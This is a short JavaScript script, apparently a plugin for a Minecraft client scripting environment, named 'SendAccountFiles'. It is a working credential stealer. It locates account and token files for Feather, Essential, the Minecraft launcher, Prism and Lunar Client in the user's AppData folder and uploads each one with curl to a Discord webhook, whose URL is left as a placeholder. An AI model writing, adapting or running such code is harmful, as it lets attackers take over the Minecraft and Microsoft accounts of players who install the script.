///api_version=2
///name=SendAccountFiles
///description=Sends account files to a Discord webhook.
///author=YourName
///version=1.0

const fs = require("fs");
const { exec } = require("child_process");

// Define the file paths and webhook URL
const featherFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".feather", "accounts.json")}`;
const essentialFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".minecraft", "essential", "microsoft_accounts.json")}`;
const minecraftFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json")}`;
const prismFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".prism", "accounts.json")}`;
const lunarFile = `${java.nio.file.Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".lunarclient", "accounts.json")}`;
const webhookUrl = "https://discord.com/api/webhooks/your-webhook-url";

// Function to send files to the webhook
function sendFileToWebhook(filePath, fileDescription) {
    if (fs.existsSync(filePath)) {
        // Use curl to send the file
        const curlCommand = `curl -X POST "${webhookUrl}" -H "Content-Type: multipart/form-data" -F "file=@${filePath}" -F "content=${fileDescription}"`;
        exec(curlCommand, (error, stdout, stderr) => {
            if (error) {
                Chat.log(`Error sending ${fileDescription}: ${error.message}`);
            } else {
                Chat.log(`Successfully sent ${fileDescription}`);
            }
        });
    } else {
        Chat.log(`${fileDescription} not found at path: ${filePath}`);
    }
}

// Send all files
sendFileToWebhook(featherFile, "Feather Accounts File");
sendFileToWebhook(essentialFile, "Essentials Accounts File");
sendFileToWebhook(minecraftFile, "Minecraft Launcher Accounts File");
sendFileToWebhook(prismFile, "Prism Accounts File");
sendFileToWebhook(lunarFile, "Lunar Accounts File");

// Debug message
Chat.log("Process complete!");
